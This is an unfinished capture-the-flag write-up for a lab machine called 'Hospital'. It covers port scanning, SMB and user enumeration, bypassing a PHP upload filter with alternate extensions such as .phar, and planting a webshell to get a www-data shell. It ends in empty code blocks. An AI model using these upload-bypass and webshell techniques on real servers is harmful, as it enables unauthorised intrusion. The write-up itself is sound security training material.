# Hospital

```bash
TARGET=10.10.11.241
```

```bash
$ sudo nmap -v -sC -sV $TARGET
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-16 21:11 PDT
...
Nmap scan report for 10.10.11.241
Host is up (0.049s latency).
Not shown: 980 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-08-17 11:11:47Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: commonName=DC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.hospital.htb
| Issuer: commonName=DC.hospital.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-16T11:07:00
| Not valid after:  2025-02-15T11:07:00
| MD5:   515c:2747:ee63:9c90:6b38:2355:95c0:27c5
|_SHA-1: b319:5382:3d35:e621:8ed1:b872:83b7:4379:291e:ed0c
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-08-17T11:12:36+00:00
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
| http-title: Login
|_Requested resource was login.php
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.55 (Ubuntu)
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2024-08-17T11:12:37
|_  start_date: N/A

NSE: Script Post-scanning.
Initiating NSE at 21:13
Completed NSE at 21:13, 0.00s elapsed
Initiating NSE at 21:13
Completed NSE at 21:13, 0.00s elapsed
Initiating NSE at 21:13
Completed NSE at 21:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.97 seconds
           Raw packets sent: 1984 (87.272KB) | Rcvd: 21 (908B)
```

We see many ports open here. And we also indication that we are running Windows and Linux. Maybe a VM or a container hosting Linux, or the other way around.

Let's add the names we found on the `nmap` output on `/etc/hosts`.

```bash
$ grep $TARGET /etc/hosts
10.10.11.241    DC.hospital.htb hospital.htb
```

Lets try to some basic enum on the AD

```bash
$ netexec smb $TARGET -u 'kali' -p '' --rid-brute
SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.241    445    DC               [-] hospital.htb\kali: STATUS_LOGON_FAILURE
```

```bash
$ netexec smb $TARGET -u '' -p ''                
SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:hospital.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.241    445    DC               [-] hospital.htb\: STATUS_ACCESS_DENIED
```

Not much here yet.

Lets try one on the `HTTPS port`.

```bash
$ curl https://$TARGET --insecure -I
HTTP/1.1 200 OK
Date: Sat, 17 Aug 2024 11:57:15 GMT
Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
X-Powered-By: PHP/8.0.28
Set-Cookie: roundcube_sessid=o242cjosq020raf53c0mpig585; path=/; secure; HttpOnly
Expires: Sat, 17 Aug 2024 11:57:15 GMT
Cache-Control: private, no-cache, no-store, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Last-Modified: Sat, 17 Aug 2024 11:57:15 GMT
X-Frame-Options: sameorigin
Content-Language: en
X-Robots-Tag: noindex, nofollow
Content-Type: text/html; charset=UTF-8
```

Per the session cookie name, it seems that this is the [Roundcube](https://github.com/roundcube/roundcubemail/tree/master).

![Hospital Webmail](images/hospital_webmail_login.png)

And it seems we have another kind of webapp on the `port 8080`.

```bash
$ curl http://$TARGET:8080 -I                      
HTTP/1.1 302 Found
Date: Sat, 17 Aug 2024 12:34:07 GMT
Server: Apache/2.4.55 (Ubuntu)
Set-Cookie: PHPSESSID=23uiharn9v8bc88rir92bmaljp; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
location: login.php
Content-Type: text/html; charset=UTF-8
```

![Port 8080 - webapp login](images/port_8080_login.png)

It seems that we have a folder called `/uploads` here, as if we try a random name, it returns `Not Found`, but when we try the uploads we get `Forbidden`.

![Port 8080 - Not Found](images/port_8080_not_found.png)
![Port 8080 - Forbidden](images/port_8080_forbidden_uploads.png)

We may try to enum other directories here later.

It seems that we can also try to enum users here, as when I tried to create a new user called `admin` it replied back informing that the user was already taken.

> This username is already taken.

![Port 8080 - user enum](images/port_8080_user_enum.png)

![Port 8080 - user enum - burp](images/port_8080_user_enum_burp.png)

We create an user and access the webapp. Its main page shows a file upload options.

![Port 8080 - File Upload](images/port_8080_upload.png)

For a test we can upload an image and see it on the `/uploads` folder we found earlier.

![Port 8080 - Burp - image upload](images/port_8080_upload_burp.png)

![Port 8080 - image upload](images/port_8080_upload_image.png)

If we try to upload a `.php` file we are redirect to a failed page.

![Port 8080 - failed php upload](images/port_8080_upload_burp_php.png)

We could try other PHP extensions to see if we can upload anything else. [HackTricks - file upload](https://book.hacktricks.xyz/pentesting-web/file-upload) has a good list we can use.

```bash
$ cat php_ext.list    
.php
.php2
.php3
.php4
.php5
.php6
.php7
.phps
.pht
.phtm
.phtml
.pgif
.shtml
.htaccess
.phar
.inc
.hphp
.ctp
.module
```

We can fuzz this list on any tool and see if we get any redirects to `success.php`.

In this case here I decide to use `Burp Intruder`.

![Port 8080 - Intruder - positions](images/port_8080_burp_intruder_positions.png)

![Port 8080 - Intruder - payloads](images/port_8080_burp_intruder_payloads.png)

![Port 8080 - Intruder - settings](images/port_8080_burp_intruder_settings.png)

![Port 8080 - Intruder - attack](images/port_8080_burp_intruder_attack.png)

It seems some of the extensions returned success. We only need one. Testing `.phar` returns the echo output we set on the uploaded file.

```bash
$ curl http://10.10.11.241:8080/uploads/test.phar
kali
```

We create a `shell.phar` file with a reverse shell php code and upload it.

![Port 8080 - RevShell Ivan](images/port_8080_rev_shell_ivan.png)

But when we try to execute it, we get an error.

```bash
$ curl http://10.10.11.241:8080/uploads/shell.phar
<pre>DAEMONIZE: pcntl_fork() does not exists, moving on...
PROC_ERROR: Cannot start the shell
</pre>
```

To investigate this, we upload another code invoking `phpinfo` and see that `pcntl_fork` and other functions are disabled.

![Port 8080 - phpinfo - disabled fuc](images/port_8080_phpinfo_disabled_func.png)

[HackTricks - PHP Useful Functions](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass) pint out to a few scripts we could use to bypass the restrictions we have here. The [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) php webshell one can automatically check and bypass the following function if some of them be disabled.

We create a file with it and upload to the target. As we access it, we get shell.

![Port 8080 - webshell](images/port_8080_webshell.png)

```bash
www-data@webserver:…/html/uploads# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
www-data@webserver:…/html/uploads# uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

```bash
www-data@webserver:…/html/uploads# cat /etc/os-release
PRETTY_NAME="Ubuntu 23.04"
NAME="Ubuntu"
VERSION_ID="23.04"
VERSION="23.04 (Lunar Lobster)"
VERSION_CODENAME=lunar
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=lunar
LOGO=ubuntu-logo
```

```bash
```

```bash
```

```bash
```
